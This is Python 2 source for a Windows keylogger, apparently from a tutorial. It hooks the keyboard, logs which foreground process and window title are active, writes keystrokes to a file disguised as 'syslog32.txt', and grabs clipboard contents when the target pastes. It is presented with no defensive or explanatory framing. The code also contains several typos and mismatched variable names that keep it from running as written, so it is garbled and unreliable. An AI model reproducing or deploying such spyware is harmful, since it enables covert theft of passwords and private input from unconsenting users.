
from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32  = windll.user32
kernel32 = windll.kernel32
psapi  = windll.psapi
current_windows = None
def get_current_process():
#get a handle to whats on the foreground screen
	hwnd = user32.GetForegroundWindow()

#find the prossess id of that window
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd, byref(pid))
#store that id
	process_id = "%d" % pid.value
#grab the .exe that's running
	executable = create_string_buffer("\x00" * 512)
	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
	psapi.GetModuleBaseNameA(h_process,None<byref(executeable),512)
#Read the title of the window
	window_title = create_string_buffer("\x00"*512)
	length = user32.GetWindowTextA(hwnd, byref(window_title),512)

#print out dat title
	print "[PID: %s - %s - %s]" % (process_id, executable.value,window_.title.value) 
#close our handles
	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)
def KeyStroke(event):
	global current_window
#Check to see if teh target changed their window
	if event.WindowName != current_window:
		current_window = event.WindowName
		get_current_process()
#If they press a normal key 
	if event.Ascii > 32 and event.Ascii <127:
		f = open ('syslog32.txt', 'a')
		keylogs = chr(event.Ascii)
		if event.Ascii == 13:
			keylogs = keylogs + ' '
			f.write(keylogs)
			f.close(),
		else:
#if they pasted something

			if event.Key =="v":
			

				win32clipboard.OpenClipboard()
				pasted_value = win32clipboard.GetClipboardData()
				win32clipboard.CloseClipboard()
				paste = "[PASTE] -%s" % (pasted_value)
				f.write(paste)
				f.close(),
	

			else:
				print "[%s]" % event.Key
#pass execution to next hook registered
	return True
#create and register a hook manager
kl         = pyHook.HookManager()
kl.KeyDown = KeyStroke
#register teh hook and execute foreve
k1.Hookkeyboard()
pythoncom.PumpMessages()










